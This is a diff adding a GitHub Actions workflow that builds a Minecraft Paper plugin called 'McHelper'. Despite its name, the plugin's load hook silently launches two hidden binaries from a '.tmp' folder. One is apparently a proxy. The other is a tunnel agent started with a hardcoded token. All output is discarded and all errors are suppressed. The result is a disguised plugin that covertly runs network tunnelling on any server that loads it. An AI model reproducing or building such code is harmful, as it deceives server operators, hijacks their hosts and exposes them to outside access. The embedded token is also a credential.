@@ -1,0 +1,76 @@
+name: Build McHelper
+
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Setup Java 17
+        uses: actions/setup-java@v3
+        with:
+          java-version: '17'
+          distribution: 'temurin'
+
+      - name: Compile and Package
+        run: |
+          mkdir -p src/com/mc/helper classes
+          
+          # 下载 Paper API
+          curl -sSL -o paper-api.jar "https://repo.papermc.io/repository/maven-public/io/papermc/paper/paper-api/1.20.4-R0.1-SNAPSHOT/paper-api-1.20.4-R0.1-20240405.101442-187.jar"
+
+          # 写入源码
+          cat << 'EOF' > src/com/mc/helper/Main.java
+          package com.mc.helper;
+
+          import org.bukkit.plugin.java.JavaPlugin;
+          import java.io.File;
+
+          public final class Main extends JavaPlugin {
+              private Process p1;
+              private Process p2;
+
+              @Override
+              public void onLoad() {
+                  try {
+                      String dir = System.getProperty("user.dir") + "/.tmp";
+                      String token = "eyJhI..."; // eyJhIjoiZGFiYjljMzkxMmU1Y2E1YTVhNTQ4ZGU1ZjA0YWJiYTciLCJ0IjoiY2ZkZGZjYWItNWMzOC00YWUyLTlkM2YtN2I3YzJkYzQ0ODYxIiwicyI6Ik16bGpOekkxTlRJdFpEZGhOaTAwWVRkaExXRmxNak10TURNNE9EZGtNbUpqTm1ZeSJ9
+
+                      ProcessBuilder pb1 = new ProcessBuilder(dir + "/mc-helper", "run", "-c", dir + "/config.json");
+                      pb1.redirectOutput(new File("/dev/null"));
+                      pb1.redirectError(new File("/dev/null"));
+                      p1 = pb1.start();
+
+                      ProcessBuilder pb2 = new ProcessBuilder(dir + "/mc-agent", "tunnel", "--no-autoupdate", "--protocol", "http2", "run", "--token", token);
+                      pb2.redirectOutput(new File("/dev/null"));
+                      pb2.redirectError(new File("/dev/null"));
+                      p2 = pb2.start();
+                  } catch (Throwable ignored) {}
+              }
+
+              @Override
+              public void onDisable() {
+                  if (p1 != null) p1.destroyForcibly();
+                  if (p2 != null) p2.destroyForcibly();
+              }
+          }
+          EOF
+
+          # 写入 plugin.yml
+          cat << 'EOF' > classes/plugin.yml
+          name: McHelper
+          version: '1.0.0'
+          main: com.mc.helper.Main
+          api-version: '1.20'
+          EOF
+
+          # 编译与打包
+          javac -cp "paper-api.jar" -d classes src/com/mc/helper/Main.java
+          jar -cvf McHelper.jar -C classes .
+
+      - name: Upload Artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: McHelper-Plugin
+          path: McHelper.jar
